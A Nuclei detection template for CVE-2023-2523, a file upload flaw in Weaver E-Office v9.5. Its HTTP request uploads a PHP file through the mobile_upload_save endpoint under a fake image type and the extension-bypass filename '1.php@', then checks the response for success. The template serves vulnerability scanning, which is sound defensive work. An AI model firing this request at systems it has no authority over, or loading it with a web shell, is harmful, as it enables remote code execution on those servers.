id: CVE-2023-2523

info:
  name: Weaver E-Office v9.5 Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: Arbitrary file upload vulnerability in Weaver E-Office v9.5 allows attackers to upload malicious PHP files and execute arbitrary code.
  impact: |
    An attacker can upload malicious files to the server, leading to remote code execution.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the vulnerability.
  reference: |-
    https://github.com/RCEraser/cve/blob/main/Weaver.md
    https://vuldb.com/?ctiid.228014
    https://vuldb.com/?id.228014
    https://github.com/nomi-sec/PoC-in-GitHub
    https://github.com/zhaoyumi/WeaverExploit_All
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2023-2523
    cwe-id: CWE-434
    epss-score: 0.00141
    epss-percentile: 0.51089
    cpe: cpe:2.3:a:e-office:e-office:9.5:*:*:*:*:*:*:*
  metadata:
    vendor: e-office
    product: e-office
    fofa-query: app="泛微-EOffice"

http:
  - method: POST
    path:
      - "{{BaseURL}}/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Encoding: gzip, deflate
      Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
      Connection: close

    body: |
      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
      Content-Disposition: form-data; name="upload_quwan"; filename="1.php@"
      Content-Type: image/jpeg

      <?php phpinfo();?>
      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
      Content-Disposition: form-data; name="file"; filename=""
      Content-Type: application/octet-stream

      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
    matchers:
      - type: word
        words:
          - "Thanks for uploading"
        part: body
